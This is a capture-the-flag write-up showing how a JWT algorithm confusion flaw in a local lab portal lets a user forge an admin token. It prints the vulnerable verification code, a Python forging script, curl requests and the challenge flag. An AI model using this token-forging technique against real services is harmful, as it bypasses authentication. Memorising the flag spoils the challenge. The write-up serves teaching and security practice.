# Writeup — Boring Corp: JWT Algorithm Confusion

**Category:** Web / Cryptography  
**Difficulty:** Medium-Hard  
**Flag:** `ctfupb{3v3n_th3_fl4g_1s_b0r1ng_zzz}`

---

## Summary

Boring Corp's employee portal issues RS256-signed JWTs and exposes the public
key at `/api/public-key`.  The verification code reads the `alg` field directly
from the (unverified) token header and reuses the public key as the HS256 HMAC
secret.  An attacker can switch `alg` to `HS256`, sign a token with
`role: admin` using the public key, and gain access to `/api/flag`.

---

## Step 1 — Reconnaissance

Login with any employee ID to receive a legitimate token:

```bash
curl -s -X POST http://localhost:5002/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"test"}' | python3 -m json.tool
```

```json
{ "token": "eyJhbGciOiJSUzI1NiIsInR5..." }
```

Decode the payload at [jwt.io](https://jwt.io):

```json
{ "username": "test", "role": "user" }
```

The `/api/flag` endpoint requires `role: admin` — escalation is needed.

---

## Step 2 — Obtain the public key

The platform advertises it openly for partner integrations:

```bash
curl http://localhost:5002/api/public-key
```

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
```

---

## Step 3 — Understand the vulnerability

The server reads `alg` from the **unverified** header and selects the
verification key accordingly:

```python
# Vulnerable code in app.py
header = jwt.get_unverified_header(token)
alg    = header.get("alg", "")

if alg == "HS256":
    payload = jwt.decode(token, PUBLIC_KEY, algorithms=["HS256"])
elif alg == "RS256":
    payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
```

When `alg=HS256` the server verifies the HMAC using `PUBLIC_KEY` (the PEM
string) as the secret.  That key is public and known — an attacker can sign
tokens with it.

---

## Step 4 — Forge the admin token

```python
import jwt, requests

pub = requests.get("http://localhost:5002/api/public-key").text.strip()

# Sign with the public key as the HMAC-SHA256 secret
token = jwt.encode(
    {"username": "attacker", "role": "admin"},
    pub,
    algorithm="HS256",
)
print(token)
```

The resulting token carries `alg: HS256` in the header and `role: admin` in the
payload.  The server accepts its signature because it uses the same `PUBLIC_KEY`
for HS256 verification.

---

## Step 5 — Retrieve the flag

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5..."   # forged token from previous step

curl http://localhost:5002/api/flag \
     -H "Authorization: Bearer $TOKEN"
```

```json
{ "flag": "ctfupb{3v3n_th3_fl4g_1s_b0r1ng_zzz}" }
```

---

## Alternative — browser dashboard

1. Log in with any employee ID → token is stored in `localStorage`.
2. In the browser console, overwrite it with the forged token:
   ```js
   localStorage.setItem("jwt", "<forged_token>");
   location.reload();
   ```
3. Click **Try /api/flag** → the flag appears on screen.

---

## Full automation

```bash
python3 solution/solve.py http://localhost:5002
```
